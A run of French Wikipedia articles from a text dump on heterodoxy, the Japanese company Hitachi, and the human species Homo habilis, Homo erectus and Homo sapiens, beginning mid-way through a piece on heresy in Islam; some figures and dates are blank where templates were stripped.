Ont été condamnés sous ce chef d'accusation Ibn al-Muqaffa (mort en 760), Bashâr Ibn Burd (mort en 785), Abu Nuwâs (mort en 810), Al Mutanabbi (mort en 965), Abu Mansur al-Hallaj (858-922), dont la vie et la passion sont contées par Louis Massignon, Abu-l-Ala al-Maari (mort en 1057), Al Suhrawardi (1154-1191), ainsi que plusieurs oulémas, dont le fondateur de la charia, Ibn Hanbal, mort en 855 quand le calife Al-Ma’mūn (813-833) instaura le motazilisme comme religion d'État.
Fitna.
La "fitna" signifie « ce qui leurre ta vision et t'entraîne dans la confusion » (la beauté, une idée…) : elle signifie la « beauté avec désordre et confusion » ; elle est « l'innovation dans les instructions religieuses » ; elle est « ce qui est condamnable ».
Dans l'islam, des savants ont été condamnés pour hérésie, comme Averroès, exposé et humilié à Cordoue, puis exilé.

</doc>
<doc id="1478" url="https://fr.wikipedia.org/wiki?curid=1478" title="Hétérodoxie">
Hétérodoxie

Le terme « hétérodoxe » vient du grec ἕτερος "héteros" (autre) et δόξα "dóxa" (opinion). Au sens littéral, il signifie donc « qui pense d'une autre manière (que la manière habituelle, dominante) ».
C'est dans le domaine de la religion, en particulier dans le christianisme, que le mot « hétérodoxe » prend un sens déterminant. Mais lorsque le monde occidental se sécularise, il s'applique à différents domaines de la vie publique.
Christianisme.
La notion d'hétérodoxie, proche de celle d'hérésie, apparaît à chaque crise dogmatique. Le cas se présente tout au long de l'histoire du christianisme. Ces moments critiques conduisent à la pratique de conciles métropolitains puis à la construction du canon biblique.
Économie.
Le monde s'étant peu à peu sécularisé à partir de la Renaissance, l'économie joue un rôle majeur dans les sociétés modernes, principalement depuis les théories d'Adam Smith. L'idée qu'il existerait "a priori" une bonne façon de gouverner contribue alors à développer une orthodoxie dans le champ des sciences économiques, ce qui ne tarde pas à provoquer, par compensation, une hétérodoxie.

</doc>
<doc id="1479" url="https://fr.wikipedia.org/wiki?curid=1479" title="Hitachi">
Hitachi

, littéralement « Lever de soleil » en japonais, est une entreprise japonaise d'électronique ayant son siège à Chiyoda-ku, Tokyo.
Histoire.
Hitachi a été fondée en 1910 par l'ingénieur électricien Namihei Odaira. Le premier produit de la société était un moteur électrique à induction de cinq chevaux, le premier au Japon. Il était initialement développé pour une utilisation dans les mines de cuivre. La société d'Odaira est rapidement devenue le chef de file national dans les moteurs électriques et les infrastructures de l'industrie de l'énergie électrique.
La société commença comme un sous-traitant de la société minière de Fusanosuke Kuhara. Hitachi provient de la superposition de deux caractères kanji : "hi" qui signifie « soleil » et "tachi" signifie « se lever ».
Hitachi déplaça son siège à Tokyo en 1918.
Hitachi America a été créée en 1959 et Hitachi Europe en 1982. Comme pour la plupart des grandes entreprises japonaises des années 1990, ses secteurs d'activités sont très variés. Elle produit notamment des puces magnétiques avec polarités inversées, des disques durs, des appareils électroménagers, des ascenseurs, des téléviseurs, des climatisations, des équipements pour les centrales nucléaires, mais aussi des pelleteuses. Hitachi est également actif dans le domaine ferroviaire avec Hitachi Rail.
Histoire récente.
En 2007, le groupe a racheté le fabricant de matériel haute-fidélité automobile Clarion, étendant ainsi son empire au domaine automobile.
Le , Western Digital annonce le rachat des activités de conception et fabrication d'espace de stockage d'Hitachi pour la somme de  de dollars. Le , Sony annonce un accord avec Hitachi, Toshiba et INCJ portant sur la mutualisation des moyens de productions de dalles LCD de petites et moyennes tailles sous la forme d'une nouvelle entreprise appelée Japan Display.
Le , Hitachi annonce le rachat de l'entreprise  appartenant aux entreprises énergétiques E.ON et RWE, pour  de livres ( d'euros), bouclé le . Horizon Nuclear Power est une entreprise travaillant sur plusieurs projets de centrales nucléaires au Royaume-Uni, sur le site de la centrale nucléaire d'Oldbury et sur celui de la centrale nucléaire de Wylfa.
Le , Hitachi et Mitsubishi Heavy Industries annoncent la fusion de leurs activités dans la production d'énergie thermique, fusion qui devrait s'achever au début de l'année 2014 ; cette filiale devrait engendrer un chiffre d'affaires de 1,5 milliard de yens, soit 18,3 millions de dollars. Mitsubishi Heavy Industries possèdera 65 % du nouvel ensemble et Hitachi 35 %.
Le , Hitachi rachète pour 810 millions d'euros les participations de l'italien Finmeccanica dans deux entreprises : 100 % du fabricant de trains Ansaldo Breda, et 40 % de l'équipementier ferroviaire (signalisation) Ansaldo STS. Hitachi devrait par la suite faire une offre de reprise sur l'ensemble des participations de Ansaldo STS pour un coût d'environ 1,86 milliard d'euros. Le nouveau groupe est rebaptisé Hitachi Rail Italy.
En , Johnson Controls et Hitachi Appliances annoncent leur décision de regrouper leurs activités mondiales de climatisation pour créer une société conjointe contrôlée à 60 % par Johnson Controls, et qui possédera les activités mondiales de climatisation de Hitachi. Hitachi Appliances représente plus de 300 milliards de yens de chiffre d'affaires (environ 2,6 milliards de dollars) pour son activité de climatisation.
En , Hitachi annonce la vente Hitachi Koki, filiale spécialisée dans les outils électriques de bricolages, au fond KKR, pour 1,3 milliard de dollars.
En , Hitachi annonce l'acquisition des activités américaines et asiatiques de Sullair pour 1,13 milliard d'euros à Accudyne Industries.
En , Faurecia annonce l'acquisition de Clarion, filiale d'Hitachi, pour 1,3 milliard de dollars.
En , ABB annonce céder une participation de 80 % de son activité dans les réseaux électriques à Hitachi pour 7,7 milliards de dollars.
En , Hitachi fusionne sa filiale Hitachi Automotive Systems avec Keihin, Showa Corporation et Nissin Kogyo, trois entreprises détenus au moins en partie par Honda, à la suite de cette opération Hitachi possèdera 66 % et Honda 33% du nouvel ensemble, appelé Hitachi Astemo. En , Hitachi annonce la vente d'une participation de 51 % dans sa filiale spécialisée dans la chimie, notamment de matériaux pour l'industrie électronique, à Showa Denko pour environ 4,5 milliards de dollars d'imagerie médicale. En parallèle, Hitachi annonce la vente de sa filiale spécialisée dans l'imagerie médicale à Fujifilm pour 1,7 milliard de dollars.
En , Hitachi annonce la cession au printemps 2021 de 60 % des parts de son activité électroménager à l'international au turc Arçelik, pour environ de dollars. Hors Japon, Hitachi vend ses produits électroménagers principalement en Asie du Sud-Est et au Moyen-Orient. Avec cette alliance, la co-entreprise compte renforcer son activité électroménager en Europe, en Afrique et dans le sous-continent indien.
En , Hitachi annonce l'acquisition de GlobalLogic, une entreprise américaine de logiciel ayant salariés, pour 9,6 milliards de dollars, reprise de dettes comprise. En , Hitachi annonce la vente de sa participation de 53 % dans sa filiale Hitachi Metals, acquit par un consortium mené par le fonds d'investissement Bain Capital rachetant l'intégralité d'Hitachi Metals pour 7,5 milliards de dollars. L'entité est renommée en 2023.
En , Hitachi annonce la vente de la moitié de sa participation de 51 % dans Hitachi Construction Machinery pour 1,7 milliard de dollars. Sur le total, 26 % seront vendus à une coentreprise entre la maison de commerce Itochu Corp. et le fonds d'investissement Japan Industrial Partners Inc. En , Hitachi annonce la vente d'une participation de 40 % dans Hitachi Transport System au fonds d'investissement KKR, pour 1,6 milliard de dollars ne gardant qu'une participation de 10 % dans Hitachi Transport System.
Actionnaires.
Liste des principaux actionnaires au .
Sites de production en Europe.
Hitachi possède une usine à Roßwein en Allemagne qui produit des pompes à injection pour l'automobile.
En 2009, Hitachi ferme son usine d'assemblage de téléviseurs LCD en Tchéquie ouverte en . 800 salariés ont perdu leur emploi.
En , Hitachi annonce la fermeture de son usine d'Ardon (Loiret) ; l'usine produisait des baies de stockage informatique. La production s'est arrêtée en .
En , Hitachi Construction Machinery Europe annonce la fermeture de son usine de Oosterhout aux Pays-Bas qui produit des mini-pelles. 115 emplois sont menacés, une partie de l'activité devrait être transférée sur le site d'Amsterdam.
Affaires judiciaires.
En , Hitachi écope avec Mitsubishi Electric d'une amende sur décision de la Commission européenne, pour avoir formé un cartel violant les règles de concurrence. En , le groupe, accusé de pratiques anticoncurrentielles aux États-Unis, annonce avoir conclu un accord avec la justice américaine. Le groupe avait déjà été mis en cause en 2013 dans une affaire similaire, impliquant plusieurs firmes japonaises.

</doc>
<doc id="1480" url="https://fr.wikipedia.org/wiki?curid=1480" title="Homo habilis">
Homo habilis

"" (littéralement « homme "habile" ») est une espèce fossile du genre "Homo" qui, d'après les fossiles connus, aurait vécu en Afrique de l'Est il y a entre environ 2,3 et 1,4 millions d’années. Cette espèce a été décrite en 1964 par Louis Leakey, Phillip Tobias et John Napier, à la suite de la découverte en 1960 des premiers fossiles de l'espèce sur le site d'Olduvaï en Tanzanie.
Compte tenu de sa longévité, "Homo habilis" a apparemment cohabité en Afrique aussi bien avec des espèces d"Australopithèques" et de "Paranthropes", plus primitives, qu'avec son possible descendant "Homo ergaster".
"Homo habilis" est contemporain des premières industries de pierre taillée nommées oldowayennes. Celles-ci comportent des objets simples taillés généralement sur une seule face pour confectionner un outil (galet aménagé) ou pour obtenir des éclats tranchants.
Classification.
Phylogénie des Homo habilis dans les Homo.
Phylogénie montrant "H. habilis" et "H. rudolfensis" en position basale au sein du genre "Homo" :
Sites de découvertes.
Des spécimens d"Homo habilis" ont été découverts en Afrique de l'Est, notamment sur les sites d'Olduvaï en Tanzanie, à partir de 1960, de Koobi Fora à l'est du lac Turkana au Kenya, à partir de 1972, de l'Omo et de la région d'Hadar en Éthiopie. Des restes d"Homo habilis" auraient aussi été trouvés en Afrique du Sud, à Swartkrans, Sterkfontein et Drimolen, sites du « berceau de l'humanité ». Cependant, l'attribution de certains fossiles trouvés en Afrique du Sud est aujourd'hui sujette à discussion entre "Homo habilis" et "Homo gautengensis", voire le genre Australopithèque. Il est possible qu"'Homo habilis" soit en fait cantonné à l'Afrique de l'Est.
Principaux fossiles.
OH 7.
 () est le spécimen-type d"Homo habilis", découvert en 1960 dans les gorges d'Olduvaï en Tanzanie par Jonathan Leakey, fils de Louis et Mary Leakey. Ces restes fossiles d'un jeune individu mâle surnommé « "" » (« enfant de Johnny ») sont constitués de fragments d'une mandibule, d'une molaire de maxillaire isolée, de deux pariétaux, de doigts et d'os de la main et du poignet. Ces restes fossiles sont âgés de d'années. La découverte et la description de ce spécimen comme une nouvelle espèce d"Homo" a été publiée en 1964 par Louis Leakey, Phillip Tobias et John Napier.
La main d' est large, avec un grand pouce et des doigts larges, semblables à ceux des humains, a une capacité de préhension précise. Cependant, contrairement à "Homo sapiens", les doigts sont relativement longs et présentent une courbure semblable à celle des chimpanzés. En outre, l'orientation du pouce par rapport aux autres doigts ressemble à celle du chimpanzé.&lt;br&gt;
La réduction de la mandibule et de la denture post-canine suggère que le régime d' "H. habilis" était moins exigeant sur le plan mécanique que celui des Hominines archaïques.
Une capacité crânienne de a été déduite de la taille des os pariétaux, en tenant compte du fait que les fossiles appartenaient à un individu mâle de 12 ou 13 ans. Cette valeur a été extrapolée par Phillip Tobias à si cet individu avait été adulte. Toutefois, d'autres scientifiques ont estimé la capacité crânienne de à . À partir de la reconstruction des pariétaux, le volume endocrânien de est estimé entre 729 et par Fred Spoor et ses collègues.
OH 24.
OH 24, surnommé « », est un crâne déformé daté d'environ d'années découvert en par Peter Nzube dans les gorges d'Olduvai. Le volume du cerveau est d'un peu moins de . Une réduction de l'avancement de la face (prognathisme) se constate par rapport à celle d'australopithèques plus primitifs.
OH 62.
Un ensemble de restes fossiles (OH 62) a été découvert par Tim White dans les mêmes gorges d'Olduvaï en 1986. OH 62 comprend des fragments de maxillaire, calvarium, mandibule, et des fragments de membres supérieurs et inférieurs, en particulier d'humérus et de fémur. L'âge estimé d' est compris entre et d'années. L'étude des proportions du fémur et de l'humérus de cet individu a permis de conclure que la locomotion d"Homo habilis", encore adaptée à la vie arboricole, diffère en cela de lignées humaines plus dérivées, comme "Homo ergaster".
KNM-ER 1805.
KNM-ER 1805 a été mis au jour par Paul Abell en 1973 à Koobi Fora, au Kenya. Les restes fossiles de cet individu adulte sont constitués d'un crâne, d'un maxillaire et d'une mandibule et sont âgés de d'années environ. La capacité crânienne est de .
KNM-ER 1813.
KNM-ER 1813 est le crâne relativement complet d'un individu adulte daté de d'années. Il a été découvert en 1973 à Koobi Fora, au Kenya, par Kamoya Kimeu. La capacité crânienne est de , plus faible que celle des autres "Homo habilis", en dessous de la limite de communément admise pour le genre "Homo", ce qui a conduit certains auteurs à classer ces restes fossiles comme ceux d"Australopithecus africanus", bien que la morphologie du crâne soit différente de celle de cette dernière espèce.
AL 666-1.
L'os maxillaire AL 666-1 provient d'Hadar en Éthiopie et son âge a été estimé à d'années. Son appartenance au genre "Homo" est reconnue, mais si ce fossile présente des affinités avec "Homo habilis" ("Homo" aff. "habilis"), et notamment aux spécimens et d'Olduvai, il n'est pas toutefois formellement attribué à cette espèce, et l'étude menée par Fred Spoor et ses collègues en 2015 sur la mandibule de exclut que soit de l'espèce "Homo habilis".
Morphologie.
Les sujets masculins mesurent de 1,30 à et pèsent de 35 à .&lt;br&gt;
L’espèce présente un fort dimorphisme sexuel, les femelles étant beaucoup plus petites que les mâles.
"Homo habilis" maitrisait la bipédie permanente, même si celle-ci n'apparaît pas avec lui, car elle est déjà présente chez l"Australopithèque". En revanche, ses membres postérieurs courts n’en faisaient pas un aussi bon marcheur que les espèces d"Homo" ultérieures. Son squelette post-crânien n'a pas encore atteint la complète extension que l'on trouve chez Homo ergaster.
"Homo habilis" a une capacité crânienne encore peu développée, comprise entre 550 et (contre 400 à chez les Australopithèques, et 400 à chez les Paranthropes).
L'étude de sa denture montre des canines réduites et des incisives développées, ce qui montre qu’"Homo habilis" était omnivore. Il est probable qu'il ait été charognard plutôt que chasseur.
"Homo habilis" et l'outil.
"Homo habilis" est contemporain des industries de pierre taillée nommées oldowayennes. Celles-ci comportent des objets simples taillés généralement sur une seule face pour confectionner un outil (galet aménagé) ou pour obtenir des éclats tranchants.
Ces outils devaient lui permettre de découper des morceaux de viande ou de casser des os. Mais "Homo habilis" a coexisté avec plusieurs espèces d'Australopithèques et de Paranthropes. Certains chercheurs admettent que ceux-ci étaient également capables de fabriquer des outils de pierre taillée. La découverte en 2012 de tels outils sur le site de Lomekwi 3 dans la région du lac Turkana au Kenya, datant de , a bouleversé l'hypothèse selon laquelle l'apparition des outils de pierre serait liée à l'émergence du genre "Homo".
Paléopathologie.
L'étude des restes d'un spécimen d’"Homo habilis" datant de 1,8 million d'années a montré qu'il souffrait d'arthrose et de rhumatismes.

</doc>
<doc id="1481" url="https://fr.wikipedia.org/wiki?curid=1481" title="Homo erectus">
Homo erectus

"" est une espèce fossile du genre "Homo" dont la définition est controversée. Son périmètre morphologique, géographique et temporel varie fortement selon les auteurs. Son nom signifie littéralement « homme érigé, redressé, droit, debout » en latin : ce nom binominal d'espèce est un héritage historique lié à la description du fossile de "Pithecanthropus erectus" par Eugène Dubois en 1894. Il s'agissait alors de la plus ancienne forme bipède connue d'Hominina, mais elle a été supplantée dès 1924 par la découverte du premier Australopithèque en Afrique du Sud.
L'un de ses fossiles admis les plus anciens est l'enfant de Mojokerto (), découvert en Indonésie sur l'île de Java. Ses fossiles les plus récents (environ ) ont été trouvés sur le site de Ngandong, également à Java. L'attribution de nombreux fossiles chinois découverts depuis 1950 demeure discutée, entre "Homo erectus", l'Homme de Denisova et d'autres groupes éventuels encore non dénommés.
Définition.
L'espèce "Homo erectus" n'a pas de définition consensuelle dans la communauté scientifique. Il existe parmi les chercheurs trois grandes tendances autour de cette appellation.
Selon la première, "Homo erectus" rassemble la plupart des fossiles africains et asiatiques connus depuis environ deux millions d'années et qui présentent une forme plus ou moins intermédiaire entre "Homo habilis" et "Homo heidelbergensis". Plusieurs appellations modernes seraient alors à considérer comme des synonymes, comme des formes ancestrales, ou comme des variétés locales de la même espèce. Cette première école est constituée d'auteurs réticents à trop subdiviser le genre "Homo", et on y trouve notamment de nombreux chercheurs américains. 
Une deuxième école considère qu"Homo ergaster" et "Homo georgicus", voire "Homo gautengensis", sont des appellations valides et représentent des formes humaines plus anciennes qu"'Homo erectus". Le périmètre de cette dernière appellation n'engloberait alors que les fossiles africains datés entre environ et la plupart des fossiles asiatiques de plus de , en raison des ressemblances morphologiques constatées entre les spécimens d'âge intermédiaire trouvés sur les deux continents.
Pour une troisième école, les fossiles asiatiques devraient être classés dans leur propre groupe, sous le nom d"Homo erectus", dans la mesure où une divergence phylogénétique présumée devrait être sanctionnée par des appellations distinctes, même si elle n'apparait pas clairement dans la morphologie. De plus, une subdivision poussée du genre "Homo" aide à y voir plus clair entre les différentes formes et permet de proposer des analyses plus précises. On trouve notamment dans cette troisième tendance l'équipe de chercheurs français du musée de l'Homme, à Paris.
Pour se comprendre et réconcilier autant que faire se peut les différents points de vue, les chercheurs emploient souvent les expressions "Homo erectus sensu lato" (au sens large) et "Homo erectus sensu stricto" (au sens strict).
Pour éviter de surcharger le présent article, seuls sont listés en fin de page les fossiles asiatiques, les autres fossiles de l'appellation prise au sens large étant présentés dans les articles consacrés aux autres espèces humaines.
Historique.
"Homo erectus" est né du regroupement d'un certain nombre de variantes régionales qui avaient été considérées comme des espèces distinctes à l'origine, dont le Pithécanthrope (Java) et le Sinanthrope (Chine). Ces différentes formes ont été réattribuées au genre "Homo" et regroupées sous la dénomination d"'Homo erectus" dans les années 1960.
À la recherche du Pithécanthrope.
Peu après la publication des travaux de Charles Darwin, notamment de "L'Origine des espèces" en 1859, le biologiste et philosophe allemand Ernst Haeckel proposa un arbre généalogique théorique de l’homme, dans lequel il faisait apparaitre un « chainon manquant », un être intermédiaire entre le singe et l’homme. Dans son ouvrage "L’Histoire de la création naturelle" paru en 1868, il nomma cette créature hypothétique "Pithecanthropus alalus". Le nom de genre fut forgé à partir des mots grecs , « grand singe » et , « homme », le nom d’espèce étant formé sur le préfixe privatif « a- » et le verbe , « parler » : l’absence de langage articulé était en effet considérée comme l’une des caractéristiques nécessaires du Pithécanthrope. 
Le médecin anatomiste néerlandais Eugène Dubois, passionné par les nouvelles théories relatives à l’origine de l’homme, entreprit de rechercher les fossiles prouvant l’existence du Pithécanthrope, que Haeckel imaginait originaire d'Asie. Pour cela, il s’engagea comme médecin militaire dans l’armée des Indes orientales néerlandaises. Nommé en 1887 à Sumatra, en Indonésie, il s’y rendit convaincu qu’il trouverait sous les tropiques les traces d’un être intermédiaire entre l’homme et les grands singes.
Après quelques années de recherches infructueuses à Sumatra, la découverte de l'Homme de Wajak en 1888 dans l'est de l'île de Java l'incita à se rendre à Java où il entreprit de fouiller les dépôts alluviaux du fleuve Solo, à Trinil, assisté de deux ingénieurs et d’un groupe de prisonniers condamnés aux travaux forcés. En 1890, il découvrit un premier fragment de mandibule. En 1891, il découvrit une molaire supérieure droite (Trinil 1) et une calotte crânienne très particulière (Trinil 2), présentant des caractéristiques qu’il considéra comme intermédiaires entre les grands singes et l’homme. En aout 1892, il exhuma sur le même site un fémur portant une excroissance pathologique (Trinil 3) mais très proche d’un fémur d"'Homo sapiens", appartenant incontestablement à un être parfaitement bipède, ainsi qu'une deuxième molaire (Trinil 4). En 1894, Dubois décrivit ces différents fossiles comme les restes d’une espèce inconnue jusqu’alors, "Pithecanthropus erectus", le « singe-homme érigé ».
La publication d’Eugène Dubois fut accueillie avec scepticisme. Seul l'Homme de Néandertal était alors connu, et ses rares fossiles, tout comme ceux de l’Homme de Cro-Magnon, suscitaient encore de nombreux débats. La plupart des spécialistes de l'époque doutaient du caractère humain de la calotte crânienne de Java et surtout de son association avec le fémur. Le doute a depuis été levé sur la calotte crânienne (Trinil 2) : elle a bien été mise au jour dans des niveaux sédimentaires anciens et représente bien une espèce humaine archaïque. En revanche, le fémur et les deux dents restent discutés.
En 1898 et 1900, alors qu'Eugène Dubois était rentré en Europe, son équipe mit au jour d'autres fossiles humains sur le site de Trinil, une dent et des diaphyses de fémurs, notés Trinil 5 à 8 et rattachés à la même espèce.
La découverte du Sinanthrope.
Le premier fossile de Sinanthrope, une dent isolée, fut découvert en 1921 par le paléontologue autrichien Otto Zdansky dans une grotte effondrée de Zhoukoudian, près de Pékin, en Chine. Otto Zdansky et le géologue suédois Johan Gunnar Andersson trouvèrent au cours des années suivantes d'autres molaires humaines fossiles, qu'Andersson décrivit en 1926.
En 1927, le médecin anatomiste canadien Davidson Black publia une seconde description des fossiles découverts par Andersson et Zdansky, qu'il attribua à une nouvelle espèce, "Sinanthropus pekinensis". Davidson Black reçut l'aide de la Fondation Rockefeller et fouilla le site jusqu'à sa mort en 1934. En , le jeune géologue chinois Pei Wenzhong découvrit la première calotte crânienne, celle d'un adolescent. À partir de ce moment, l'existence de l'Homme de Pékin commença à être reconnue.
Pierre Teilhard de Chardin, paléontologue spécialiste des mammifères tertiaires d'Asie, se vit confier par le "Geological Survey of China" (GSC) la supervision du chantier de fouilles de Zhoukoudian pour la géologie et l'étude de la faune. Les fouilleurs et chercheurs chinois récoltèrent progressivement un nombre important de fragments fossiles humains. En 1937, le laboratoire du Cénozoïque, créé à cette occasion par le GSC, avait récolté en tout 14 crânes partiels, 11 fragments de mandibules, 117 dents, et 15 fragments de fémurs. C'était la première fois qu'autant de restes d'une même espèce humaine disparue et aussi ancienne étaient collectés en stratigraphie. L'étude paléoenvironnementale des remplissages et l'étude anatomique des fossiles, réalisées avec les moyens les plus modernes de l'époque, devinrent des références pour la science préhistorique.
La guerre avait commencé entre Chine et Japon, et les fouilles durent s'arrêter en 1937, pour préserver la sécurité des chercheurs. En 1941, devant l'avancée des troupes japonaises vers Pékin, les fossiles furent placés dans deux grandes caisses et partirent par voie de chemin de fer en direction d'un port vers les États-Unis. Ils n'y arriveront jamais, occasionnant une grave perte pour la paléoanthropologie. Le médecin anatomiste allemand Franz Weidenreich, successeur de Davidson Black sur le site, avait cependant procédé à une description écrite minutieuse et détaillée de chacun des fossiles découverts, qui fut préservée et sert toujours aujourd'hui de référence pour l'étude de l'Homme de Pékin.
La communauté scientifique accueillit d'abord avec réserve la découverte de l'Homme de Pékin, comme lors des précédentes découvertes de l'Homme de Néandertal et du Pithécanthrope. Puis les esprits commencèrent à se faire à l'idée de l'existence d'une forme humaine plus ancienne et plus archaïque que l'Homme de Néandertal. Le fait que l'Homme puisse avoir une histoire ancienne commençait à être plus largement accepté.
L'émergence d"'Homo erectus".
En 1939, le paléontologue germano-néerlandais Gustav von Koenigswald apporta plusieurs spécimens fossiles humains javanais à Franz Weidenreich, qui travaillait sur l'Homme de Pékin, en Chine. La comparaison des fossiles javanais avec ceux de l'Homme de Pékin, ou "Sinanthropus pekinensis", trouvés sur le site chinois de Zhoukoudian, les amena à conclure que les morphologies étaient très proches. Ils décidèrent alors d'abandonner le genre "Sinanthrope", créé par Davidson Black en 1927, en ramenant tous les fossiles chinois au genre de création antérieure "Pithécanthrope".
En 1950, le biologiste germano-américain Ernst Mayr proposa de remplacer le genre "Pithécanthrope", ainsi que la plupart des genres paléoanthropologiques divers créés jusque là, par le seul genre "Homo", en affirmant l'appartenance de tous les fossiles connus à un genre unique, et des fossiles d'une même période à une même espèce. Il obtint dans les années 1960 un consensus scientifique sur ce changement général de dénominations, avant que la tendance s'inverse dans les décennies suivantes. L'appellation "Pithécanthrope" n'a plus aujourd'hui qu'une valeur historique.
Afrique et Asie.
À partir de 1960, les paléoanthropologues découvrirent des fossiles humains encore plus anciens en Afrique de l'Est, avec le premier fossile d"Homo habilis" trouvé en 1960 (décrit et nommé en 1964), et le premier fossile reconnu d"Homo ergaster" trouvé en 1971 (décrit et nommé en 1975). Pendant une trentaine d'années, les fossiles africains d"Homo ergaster" furent connus sous l'appellation d"Homo erectus".
En 1991, Bernard Wood, à l'époque à l'université de Liverpool, proposa de désigner sous le nom d"Homo ergaster" le groupe africain de fossiles d’"Homo erectus", plus généraliste et plus primitif que le groupe indonésien et chinois. Dans cette optique, "Homo erectus" était considéré comme exclusivement asiatique. Ce point de vue a été repris par un certain nombre d'auteurs, qui attribuent désormais à "Homo ergaster" tout ou partie des fossiles africains auparavant rattachés à "Homo erectus". "Homo ergaster" pourrait être l’ancêtre d’"Homo erectus" en Asie, d"Homo antecessor" en Europe, et d"Homo rhodesiensis" en Afrique, bien qu'aucune phylogénie ne fasse encore consensus.
La paléoanthropologue Amélie Vialet distingue deux morphologies crâniennes différentes sous les appellations "Homo ergaster" et "Homo erectus", qui correspondraient à deux clades distincts. La première correspondrait à des formes africaines et la seconde à des formes asiatiques. Elle attribue notamment le fossile de l'Homme de Kocabaş (une calotte crânienne trouvée en 2002 en Turquie, et datée entre ) au clade africain. Il s'agit d'un des rares fossiles anciens trouvés à ce jour au Moyen-Orient.
Certains fossiles africains d'âge compris entre 1,6 et 1,2 Ma ressemblent toutefois aux fossiles asiatiques plus tardifs, ce qui semble contredire l'idée qu' "H. erectus" serait une forme tôt sortie d'Afrique et ayant évolué en Asie, à moins qu'il y ait eu des mouvements anciens de retour vers l'Afrique.
Datations.
En 1981, une mandibule humaine juvénile a été découverte dans les hautes terres d'Éthiopie, associée à des outils de types Oldowayen et Acheuléen précoce (1,95 Ma). En 2023, ce fossile a été daté d'environ et l'imagerie par rayons X appliquée aux amorces des dents définitives indique qu'il s'agirait d'un bébé "H. erectus sensu lato", c'est-à-dire possiblement d'un "Homo ergaster". Cette découverte confirme qu' "H. ergaster / H. erectus" a employé des outils des deux types, et aussi qu'il a pu vivre ou au moins fréquenter de hautes altitudes.
En 2019, l’équipe de Russel Ciochon (université de l'Iowa) a conclu une décennie de travail de datation des fossiles de Ngandong, à Java, en Indonésie, dont l’ancienneté variait jusque-là selon les études entre . Ils sont finalement datés entre (par l'uranium-thorium, la thermoluminescence, et l'argon-argon), ce qui en fait les "Homo erectus" les plus récents connus.
Caractéristiques physiques.
"Homo erectus" est une espèce à la fois plus petite et plus robuste qu"Homo sapiens". Son squelette post-crânien est constitué d'os plus volumineux et les os de son crâne sont plus épais.
Les principales caractéristiques physiques d"'Homo erectus" sont une mâchoire puissante, un prognathisme marqué, un front assez bas, un chignon occipital, un bourrelet supra-orbitaire sous forme de torus continu, une constriction post-orbitaire fréquente en vue supérieure, une carène sagittale plus ou moins marquée et un crâne en forme de tente en vue postérieure (non-développement des bosses pariétales). 
"Homo erectus" montre un prognathisme facial marqué, une base du crâne large, une voute crânienne basse dont la plus grande largeur se situe au niveau des crêtes susmastoïdiennes, et un angle occipital particulièrement aigu.
Il mesurait entre 1,50 et , pesait entre 45 et et avait une capacité crânienne de .
Le paléoanthropologue japonais Yousuke Kaifu distingue deux groupes de fossiles distincts en Asie, le groupe chinois et le groupe javanais, qui pourraient représenter une divergence phylogénétique ancienne au sein de l'espèce (voir liste des principaux fossiles rattachés en fin d'article).
Culture et techniques.
"Homo erectus" était cueilleur de fruits, de plantes, et de racines, mais aussi charognard et chasseur de petits animaux et de plus gros à l'occasion. En 2023, une étude des rapports Sr/Ca et C/C de l'émail dentaire d"'H. erectus" ayant vécu à Java au Pléistocène inférieur à moyen confirme la diversité de leur régime alimentaire, avec des variations saisonnières peu marquées (un peu plus de végétaux tendres et énergétiques pendant la mousson, un peu plus de plantes coriaces et moins énergétiques pendant la saison sèche).
Certains archéologues pensent que l'outillage des "Homo erectus" indonésiens et chinois, relativement pauvre en outils de pierre, devait être complété par un important outillage de bambou, encore très abondamment utilisé dans ces régions. Cette hypothèse reste délicate à tester dans la mesure où le bois ne se fossilise que dans des conditions exceptionnelles.
Principaux fossiles asiatiques attribués à l'espèce.
Les fossiles africains ou ouest-asiatiques attribués par certains auteurs à "Homo erectus sensu lato" sont présentés dans les articles consacrés aux différentes appellations modernes d'espèces humaines. En Asie orientale, seules l'Indonésie et la Chine ont à ce jour livré des fossiles attribués consensuellement à "Homo erectus sensu stricto".
Indonésie.
Homme de Java.
Homme de Java (Java)
Homme de Solo.
Homme de Solo (Java)
Homme de Sangiran.
Homme de Sangiran (Java)
Enfant de Mojokerto.
Enfant de Mojokerto (Java oriental)

</doc>
<doc id="1482" url="https://fr.wikipedia.org/wiki?curid=1482" title="Homo sapiens">
Homo sapiens

', plus communément appelé « », « "' », « », « » ou « », est une espèce de Primates originaire d'Afrique qui s'est aujourd'hui répandue et naturalisée sur l'ensemble de la Terre hormis l'Antarctique. Il appartient à la famille des Hominidés et est le seul représentant actuel du genre "Homo", les autres espèces étant éteintes. Les plus anciens fossiles connus de cette espèce, découverts au Maroc, sur le site de Djebel Irhoud, sont datés d'environ .
Parmi les Hominidés actuels, il se distingue du point de vue physiologique par un mode locomoteur au sol exclusivement bipède, son cerveau plus volumineux et sa pilosité moins développée. Il faut ajouter à ces critères l’existence d’une ménopause chez la femelle (femme), rare chez les autres Hominidés.
Du point de vue de l'éthologie, et par rapport au reste du règne animal, l"'Homo sapiens" se distingue par la complexité de ses relations sociales, l'utilisation d'un langage articulé élaboré transmis par l'apprentissage, la fabrication d'outils, le port de vêtements, la maîtrise du feu, la domestication de nombreuses espèces végétales et animales, ainsi que l'aptitude de son système cognitif à l'abstraction, à l'introspection et à la spiritualité. Certaines de ces caractéristiques étaient partagées par d'autres espèces du genre "Homo".
Plus généralement, il se distingue de toute autre espèce animale par l'abondance et la sophistication de ses réalisations techniques et artistiques, l'importance de l'apprentissage et de l'apport culturel dans le développement de l'individu, mais aussi par l'ampleur des transformations qu'il opère sur les écosystèmes.
La science qui étudie les êtres humains actuels sous tous leurs aspects est l'anthropologie. Celle qui étudie son évolution est la paléoanthropologie.
Étymologie et appellations.
L'espèce "Homo sapiens" fut décrite par Carl von Linné en 1758 dans la de son ouvrage "Systema naturae". Deux siècles plus tard, William Thomas Stearn désigna Linné lui-même comme lectotype de l'espèce.
Le mot français « Homme » est une évolution du latin , accusatif de (« être humain »), et peut faire référence à l'espèce "" dans son ensemble (le nominatif a donné en français le pronom indéfini « on »). "Sapiens" est un adjectif latin signifiant « intelligent, sage, raisonnable, prudent », adjectif issu du participe présent du verbe "sapere" signifiant « avoir du goût, de la saveur, du jugement ».
